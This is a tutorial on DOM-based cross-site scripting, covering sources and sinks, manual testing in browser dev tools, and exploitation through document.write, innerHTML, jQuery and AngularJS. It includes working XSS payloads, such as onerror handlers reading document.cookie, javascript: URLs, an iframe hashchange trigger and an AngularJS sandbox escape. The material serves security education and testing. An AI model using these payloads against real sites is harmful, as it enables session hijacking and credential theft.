# 1. What is DOM-Based XSS

Normally, cross-site scripting happens when a server takes user input and puts it into a page's HTML. **DOM-based XSS is different** — the whole bug happens *inside the browser*, using JavaScript that's already on the page. The server might never see the malicious data at all.

### The basic idea

It boils down to two things:

1. **A "source"** — somewhere JavaScript reads attacker-controllable data from (most commonly the URL)
2. **A "sink"** — somewhere that data gets used in a way that can run code

If data flows from a source straight into a sink without being sanitized, an attacker can make the page execute their own JavaScript in the victim's browser — which can lead to session hijacking, stolen credentials, etc.

### A simple example

Imagine a page has this script:

```javascript
// Reads the "name" from the URL fragment and displays it
var params = new URLSearchParams(window.location.search);
var name = params.get('name');
document.getElementById('welcome').innerHTML = 'Hello, ' + name;
```

This looks harmless — it's just greeting the user by name. But:

- **Source**: `window.location.search` (the URL query string)
- **Sink**: `innerHTML` (which renders raw HTML, including `<script>`-like content)

A normal link looks like:
```
https://example.com/page?name=Alice
```

But an attacker could send a victim this link instead:
```
https://example.com/page?name=<img src=x onerror=alert(document.cookie)>
```

When the victim's browser loads the page, the script pulls that payload straight out of the URL and injects it into the page via `innerHTML` — and the malicious code runs, right in the victim's own logged-in session.

### Common sources

| Source | Example |
|---|---|
| URL query string | `window.location.search` |
| URL fragment (after `#`) | `window.location.hash` |
| Full URL | `window.location.href` |
| URL path | `window.location.pathname` |

### Common sinks

| Sink | Why it's dangerous |
|---|---|
| `eval()` | Runs a string as literal JavaScript |
| `innerHTML` / `outerHTML` | Renders raw HTML, including scripts/tags |
| `document.write()` | Injects raw HTML into the page |
| `setTimeout()` / `setInterval()` (with a string arg) | Can execute a string as code |

The following are some of the **Vanilla JavaScript sinks** that can lead to DOM-XSS vulnerabilities:
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

**jQuery sinks** — these functions can also introduce DOM XSS if attacker-controlled data is passed into them:
```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

### Why the URL is the classic attack vector

Since the URL is fully controlled by whoever creates the link, an attacker just needs to craft a malicious URL and trick someone into clicking it (via email, chat, a fake ad, etc.). The payload usually goes in the **query string** or **fragment** (`?name=...` or `#name=...`), since those are the easiest parts of the URL to manipulate. In some special cases — like a page that echoes back a 404 URL, or certain PHP-based sites — the payload can even be placed in the **path** itself (e.g., `/page/<script>...`).

# 2. How to Test for DOM-Based XSS

If you're doing this at scale, **Burp Suite's scanner** can automatically catch most DOM XSS issues. But if you want to test manually, here's how it works using browser dev tools (e.g. Chrome).

The general approach: go through each possible **source** one at a time, inject something identifiable, and trace where it ends up.

---

## 2.1 - Testing HTML sinks

**Step 1 — Inject a marker.** Put a random, unique string into a source, like the URL:

```
https://example.com/page?name=zzXSSzz123
```

**Step 2 — Search the live DOM, not "View Source."** This is important: "View Source" shows the *original* HTML sent by the server, not the HTML after JavaScript has modified it. Since DOM XSS is caused by JavaScript changes, you need to inspect the *actual* DOM.

In Chrome dev tools, open the **Elements** panel and press `Ctrl+F` (or `Cmd+F` on Mac) to search the rendered DOM for your marker string (`zzXSSzz123`).

**Step 3 — Figure out the context, then refine your payload.** Wherever your string shows up, look at *how* it's embedded, and craft your test input accordingly:

```html
<!-- If it lands inside an attribute like this: -->
<img src="zzXSSzz123">

<!-- Try breaking out of the attribute: -->
?name="><img src=x onerror=alert(1)>

<!-- If it lands inside a tag body like this: -->
<div>zzXSSzz123</div>

<!-- Try injecting a tag directly: -->
?name=<img src=x onerror=alert(1)>
```

**A gotcha to watch for — URL encoding:**
- Chrome, Firefox, and Safari automatically **URL-encode** `location.search` and `location.hash`.
- Old IE11 / pre-Chromium Edge did **not**.

If your payload comes back encoded (e.g. `%3Cimg%20src%3Dx%3E` instead of `<img src=x>`), it usually means the browser neutralized it before it could execute — so the attack likely won't work through that specific source/browser combo.

---

## 2.2 - Testing JavaScript execution sinks (harder)

Sinks like `eval()` don't necessarily print your input anywhere visible in the DOM — so you can't just `Ctrl+F` for it. You need to trace the *code*, not the *page*.

**Step 1 — Find where the source is read.** Use `Ctrl+Shift+F` (or `Cmd+Alt+F` on Mac) in Chrome dev tools to search **all** the page's JavaScript for references to a source, e.g.:

```javascript
location.search
location.hash
location.href
```

**Step 2 — Set a breakpoint and follow the data.** Once you find where the source is read, set a breakpoint there in the debugger. Step through the code and watch where that value goes:

```javascript
var query = location.search;        // <- breakpoint here
var name = query.split('=')[1];     // value gets reassigned...
eval("greet('" + name + "')");      // ...and eventually hits a sink
```

If the value gets passed into new variables, repeat the search for those variable names to keep tracing the flow.

**Step 3 — Confirm the sink and test.** When you find where the tainted value reaches a sink (`eval`, `innerHTML`, etc.), hover over the variable in the debugger to inspect its exact value right before execution. Then — same as with HTML sinks — refine your payload until you get code execution:

```javascript
// Example payload if reaching eval():
?name=x'); alert(document.cookie); //
```

## 2.3 - The easier way: DOM Invader

Manually digging through often-minified JavaScript to trace sources to sinks is tedious. If you're using **Burp's built-in browser**, its **DOM Invader** extension automates most of this — automatically flagging sources, sinks, and taint flow — so you don't have to do it all by hand.

# 3. Exploiting DOM XSS: It Depends on the Sink

Just because data flows from a source to a sink doesn't mean every exploit looks the same. **Different sinks behave differently**, so your payload has to match the sink you're targeting. On top of that, the site's own JavaScript might filter or transform your input along the way — so you often need to adjust your payload to survive that processing too.

Here are two of the most common sinks and how to actually exploit them:

---

### `document.write()` — you *can* use `<script>` tags

This sink is more forgiving — it will happily execute a `<script>` tag:

```javascript
document.write('... <script>alert(document.domain)</script> ...');
```

**Watch out for surrounding context.** Sometimes your injected string lands in the middle of existing HTML, so you may need to first "close" open tags before your payload will work cleanly. For example:

```javascript
// If the vulnerable code looks like this:
document.write('<div class="' + userInput + '">');

// You might need a payload like:
"><script>alert(document.domain)</script>

// So the final HTML becomes:
<div class=""><script>alert(document.domain)</script>">
```

---

### `innerHTML` — `<script>` tags do NOT work here

This is the important difference: modern browsers **block `<script>` tags injected via `innerHTML`** from executing — as a built-in protection. `<svg onload=...>` doesn't fire either.

So you have to use a different trick: **elements with event handlers**, like `<img>` or `<iframe>`, where the "bad" code runs inside an attribute like `onerror` or `onload` instead of inside a `<script>` tag:

```javascript
element.innerHTML = '... <img src=1 onerror=alert(document.domain)> ...';
```

How this works:
- `<img src=1>` — the browser tries to load an image from `"1"`, which isn't a real image
- Since it fails to load, the `onerror` handler fires
- The JavaScript inside `onerror` executes

Other equivalent examples:

```html
<iframe src="javascript:alert(document.domain)"></iframe>

<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
```

## 3.1 - Sources & Sinks in Third-Party Libraries (jQuery, AngularJS)

It's not just plain JavaScript — the **libraries and frameworks** you rely on can introduce their own sources and sinks too. Two common offenders: jQuery and AngularJS.

---

### DOM XSS in jQuery

**1. The `attr()` sink**

jQuery's `.attr()` function changes an element's attribute. If it's fed attacker-controlled data, it can become a sink.

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

This sets a "back" link's `href` based on a `returnUrl` URL parameter. Looks harmless — until you realize `href` can hold a `javascript:` URL:

```
?returnUrl=javascript:alert(document.domain)
```

Now when the victim clicks the "back" link, it runs your JavaScript instead of navigating anywhere.

---

**2. The `$()` selector sink — the classic `location.hash` bug**

jQuery's `$()` function can also be a sink, because you can pass it raw content and it will try to turn it into DOM elements. A very old but common pattern combined this with `location.hash` for scroll-to-element behavior:

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

Since `location.hash` (the part of the URL after `#`) is fully attacker-controlled, you could inject HTML through it, and `$()` would render that HTML into the page.

**Modern jQuery has patched the easy version of this** — it now refuses to treat input as HTML if it starts with `#`. But older code, or cases where you control the input *without* a leading `#`, can still be exploitable.

**The catch:** to exploit `hashchange`, something needs to actually change the hash — but that normally requires the victim to interact with the page. The workaround is to trigger it automatically using an `iframe`:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

How it works:
1. The iframe loads the page with an empty `#` hash
2. Once loaded (`onload`), JavaScript appends a payload to the hash
3. Changing the hash fires the `hashchange` event — with no victim clicks needed
4. `$(location.hash)` receives `<img src=1 onerror=alert(1)>` and renders it, triggering the `onerror`

---

### DOM XSS in AngularJS

AngularJS introduces a totally different attack style — **no angle brackets, no `<script>` or `<img>` tags needed at all.**

If a page has the `ng-app` attribute anywhere in its HTML, AngularJS "activates" and starts scanning the page for expressions. Specifically, **anything inside double curly braces `{{ }}`** gets evaluated as an Angular expression — whether it appears in the page body or inside an HTML attribute:

```html
<div ng-app>
  {{ 'Hello ' + 'World' }}   <!-- Angular evaluates this and renders: Hello World -->
</div>
```

If attacker-controlled data ends up inside `{{ }}`, you can smuggle in a JavaScript payload without needing any HTML tags at all:

```
{{constructor.constructor('alert(document.domain)')()}}
```

This works because in Angular's expression sandbox, `constructor.constructor(...)` can be abused to reach the underlying `Function` constructor — effectively letting you run arbitrary JavaScript just by getting your text reflected between `{{ }}`.

---

### Takeaway

| Library | Sink | Payload style |
|---|---|---|
| jQuery | `.attr()` | `javascript:alert(document.domain)` |
| jQuery | `$()` selector + `location.hash` | `<img src=1 onerror=alert(1)>` via forced `hashchange` |
| AngularJS | `{{ }}` expression evaluation | `{{constructor.constructor('alert(1)')()}}` |

The general lesson: don't just think about `eval()` and `innerHTML` — any library function that turns strings into DOM content, attributes, or expressions is a potential sink, and needs the same source-to-sink scrutiny.

## 3.2 - DOM XSS + Reflected/Stored Data

So far, the DOM XSS examples were "pure" — everything happens client-side, in a single page load: JavaScript reads from the URL, writes to a sink, done. The server never sees or touches the malicious data.

But that's not the only way DOM XSS can happen. **The server itself can act as a source** — by taking data from a request and putting it back into the page. This is where DOM XSS overlaps with the more "classic" reflected/stored XSS you may already know.

---

### Reflected DOM XSS

Here, the **server** echoes data from the request back into the HTML response — but instead of that data directly breaking out into HTML (classic reflected XSS), it gets picked up by a **script on the page**, which then unsafely passes it to a sink.

Example — the server embeds a URL parameter into an inline script:

```javascript
// Server outputs something like this into the page's HTML:
eval('var data = "reflected string"');
```

If `reflected string` is built directly from a URL parameter, and the server doesn't properly escape quotes, an attacker could send:

```
?name=test";alert(document.domain);//
```

...causing the server-generated script to become:

```javascript
eval('var data = "test";alert(document.domain);//"');
```

The `eval()` sink then executes the injected code. It "looks" server-driven (like classic reflected XSS), but the actual damage happens because the data reaches a **DOM sink** (`eval()`) — which is what makes it a *DOM-based* variant, not a plain reflected one.

---

### Stored DOM XSS

Same idea, but with a time delay: the server **saves** attacker-controlled data (e.g., in a database), then serves it back later — often to a completely different user — where a script on the page unsafely writes it to a sink.

Classic example — a comments feature:

```javascript
element.innerHTML = comment.author;
```

Here's the flow:
1. Attacker posts a comment, setting their "author name" to a malicious payload:
   ```
   <img src=1 onerror=alert(document.cookie)>
   ```
2. The server stores this in the database, no questions asked
3. Later, another user loads the comments page
4. The server sends back `comment.author` (the attacker's payload) as part of the page data
5. The page's JavaScript runs `element.innerHTML = comment.author`, injecting the payload into the DOM
6. The victim's browser renders the `<img>` tag, `onerror` fires, and the attacker's JavaScript executes — in the *victim's* session, not the attacker's

This is especially dangerous because it doesn't require tricking anyone into clicking a crafted link — the payload just sits there and fires automatically for every visitor.

---

### Why this distinction matters

| Type | Where data comes from | Where the danger is |
|---|---|---|
| Pure DOM XSS | Browser source (URL, etc.) | Entirely client-side |
| Reflected DOM XSS | Server echoes request data into the page | Client-side script unsafely handles it |
| Stored DOM XSS | Server saves and later re-serves data | Client-side script unsafely handles it |

In all three cases, the actual *vulnerability* is the same core issue — unsanitized data reaching a dangerous sink. The difference is just **where the tainted data originally comes from**, which affects how you'd find and exploit it (e.g., stored DOM XSS may need you to submit data in one place and observe execution somewhere else entirely).
